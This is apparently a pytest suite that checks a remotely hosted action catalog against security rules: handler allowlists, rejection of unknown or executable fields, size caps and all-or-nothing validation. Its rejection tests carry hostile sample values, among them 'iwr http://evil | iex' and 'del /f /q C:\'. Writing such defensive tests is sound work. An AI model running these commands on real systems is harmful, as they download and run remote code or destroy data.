"""Catalog validation, with emphasis on the security invariants.

These tests are the reason the catalog can be served from a public GitHub repo.
Each one encodes a specific way a hostile or merely broken catalog could do
damage, and asserts that validation refuses it.
"""

from __future__ import annotations

import copy
import json

import pytest

from bloodlust.core import catalog as cm


# ------------------------------------------------------------- the real catalog


def test_shipped_catalog_is_valid(catalog, catalog_payload):
    """The catalog in this repo must pass its own validation."""
    assert len(catalog.actions) == len(catalog_payload["actions"])
    assert len(catalog.families) == len(catalog_payload["families"])


def test_shipped_catalog_every_handler_is_shipped(catalog, allowlist):
    for spec in catalog.actions.values():
        assert spec.handler in allowlist, f"{spec.id} -> {spec.handler}"


def test_shipped_catalog_families_all_declared(catalog):
    for spec in catalog.actions.values():
        assert spec.family in catalog.families, f"{spec.id} uses undeclared family {spec.family}"


def test_shipped_catalog_ids_are_unique(catalog_payload):
    ids = [a["id"] for a in catalog_payload["actions"]]
    assert len(ids) == len(set(ids))


def test_shipped_catalog_risk_counts(catalog):
    counts = catalog.count_by_risk()
    # Sanity: a catalog that is entirely "safe" would be a sign the risk labels
    # stopped being meaningful.
    assert counts["safe"] > 0
    assert counts["aggressive"] > 0
    assert sum(counts.values()) == len(catalog.actions)


def test_default_enabled_excludes_aggressive(catalog):
    """'Run all' must never silently apply an aggressive action."""
    for spec in catalog.actions.values():
        if spec.risk == "aggressive":
            assert spec.default_enabled is False, (
                f"{spec.id} is aggressive but default_enabled; a batch run "
                "would apply it without the user choosing it"
            )


# ------------------------------------------------------------- reject: bad shape


def test_rejects_non_object_root(allowlist):
    with pytest.raises(cm.CatalogError):
        cm.validate([], allowlist)


def test_rejects_wrong_schema_version(catalog_payload, allowlist):
    payload = copy.deepcopy(catalog_payload)
    payload["schema"] = 99
    with pytest.raises(cm.CatalogError) as exc:
        cm.validate(payload, allowlist)
    assert any("schema" in p for p in exc.value.problems)


def test_rejects_empty_action_list(allowlist):
    payload = {"schema": cm.CATALOG_SCHEMA_VERSION, "families": [], "actions": []}
    with pytest.raises(cm.CatalogError):
        cm.validate(payload, allowlist)


def test_collects_every_problem_not_just_the_first(catalog_payload, allowlist):
    payload = copy.deepcopy(catalog_payload)
    payload["schema"] = 99
    payload["actions"][0]["risk"] = "lethal"
    payload["actions"][1]["id"] = "!!bad id!!"
    with pytest.raises(cm.CatalogError) as exc:
        cm.validate(payload, allowlist)
    assert len(exc.value.problems) >= 3


# ------------------------------------------------- SECURITY: no remote code


def test_rejects_handler_not_in_allowlist(catalog_payload, allowlist):
    """The central control: a remote catalog cannot introduce new code."""
    payload = copy.deepcopy(catalog_payload)
    payload["actions"][0]["handler"] = "os.system"
    with pytest.raises(cm.CatalogError) as exc:
        cm.validate(payload, allowlist)
    assert any("not shipped by this build" in p for p in exc.value.problems)


@pytest.mark.parametrize(
    "smuggled",
    [
        {"command": "powershell -enc AAAA"},
        {"script": "Get-Process | Stop-Process"},
        {"powershell": "iwr http://evil | iex"},
        {"exe": "C:\\Windows\\System32\\calc.exe"},
        {"shell": "del /f /q C:\\"},
        {"payload": {"nested": {"argv": ["cmd", "/c", "whoami"]}}},
        {"post_run": "reboot"},
    ],
)
def test_rejects_any_executable_field(catalog_payload, allowlist, smuggled):
    """Unknown action keys are a hard error, not ignored.

    This is what stops a field being added to the catalog today in the hope
    that a future app version will honour it.
    """
    payload = copy.deepcopy(catalog_payload)
    payload["actions"][0].update(smuggled)
    with pytest.raises(cm.CatalogError) as exc:
        cm.validate(payload, allowlist)
    assert any("cannot carry executables" in p for p in exc.value.problems)


def test_rejects_non_primitive_args(catalog_payload, allowlist):
    payload = copy.deepcopy(catalog_payload)
    payload["actions"][0]["args"] = {"argv": ["cmd", "/c", "whoami"]}
    with pytest.raises(cm.CatalogError) as exc:
        cm.validate(payload, allowlist)
    assert any("must be a JSON primitive" in p for p in exc.value.problems)


def test_rejects_unknown_top_level_key(catalog_payload, allowlist):
    payload = copy.deepcopy(catalog_payload)
    payload["auto_apply_on_start"] = True
    with pytest.raises(cm.CatalogError) as exc:
        cm.validate(payload, allowlist)
    assert any("unknown top-level key" in p for p in exc.value.problems)


def test_rejects_unknown_requires_key(catalog_payload, allowlist):
    payload = copy.deepcopy(catalog_payload)
    payload["actions"][0]["requires"] = {"platform": "win32", "or_run_instead": "format"}
    with pytest.raises(cm.CatalogError) as exc:
        cm.validate(payload, allowlist)
    assert any("unknown requires key" in p for p in exc.value.problems)


def test_rejects_unknown_family_reference(catalog_payload, allowlist):
    payload = copy.deepcopy(catalog_payload)
    payload["actions"][0]["family"] = "nonexistent"
    with pytest.raises(cm.CatalogError) as exc:
        cm.validate(payload, allowlist)
    assert any("not declared in 'families'" in p for p in exc.value.problems)


def test_rejects_bad_risk(catalog_payload, allowlist):
    payload = copy.deepcopy(catalog_payload)
    payload["actions"][0]["risk"] = "yolo"
    with pytest.raises(cm.CatalogError) as exc:
        cm.validate(payload, allowlist)
    assert any("risk must be one of" in p for p in exc.value.problems)


def test_rejects_duplicate_action_id(catalog_payload, allowlist):
    payload = copy.deepcopy(catalog_payload)
    payload["actions"].append(copy.deepcopy(payload["actions"][0]))
    with pytest.raises(cm.CatalogError) as exc:
        cm.validate(payload, allowlist)
    assert any("duplicate id" in p for p in exc.value.problems)


def test_rejects_oversize_payload(allowlist):
    with pytest.raises(cm.CatalogError) as exc:
        cm.load_bytes(b"x" * (5 * 1024 * 1024), allowlist)
    assert any("byte cap" in p for p in exc.value.problems)


def test_rejects_invalid_json(allowlist):
    with pytest.raises(cm.CatalogError) as exc:
        cm.load_bytes(b"{not json", allowlist)
    assert any("not valid JSON" in p for p in exc.value.problems)


# ------------------------------------------------------------------ provenance


def test_provenance_records_remote_source(catalog_payload, allowlist):
    cat = cm.validate(
        catalog_payload, allowlist, source="remote",
        url="https://raw.githubusercontent.com/x/y/main/catalog/catalog.json",
        sha256="abc123",
    )
    prov = cat.provenance.to_dict()
    assert prov["source"] == "remote"
    assert prov["sha256"] == "abc123"
    assert prov["fetched_at"] is not None


def test_all_or_nothing_validation(catalog_payload, allowlist):
    """One bad action rejects the whole catalog. No partial application."""
    payload = copy.deepcopy(catalog_payload)
    payload["actions"][-1]["handler"] = "evil.handler"
    with pytest.raises(cm.CatalogError):
        cm.validate(payload, allowlist)
    # Nothing was half-built: the caller keeps whatever it had before.


def test_bom_prefixed_payload_parses(catalog_payload, allowlist):
    raw = b"\xef\xbb\xbf" + json.dumps(catalog_payload).encode("utf-8")
    cat = cm.load_bytes(raw, allowlist)
    assert len(cat.actions) == len(catalog_payload["actions"])
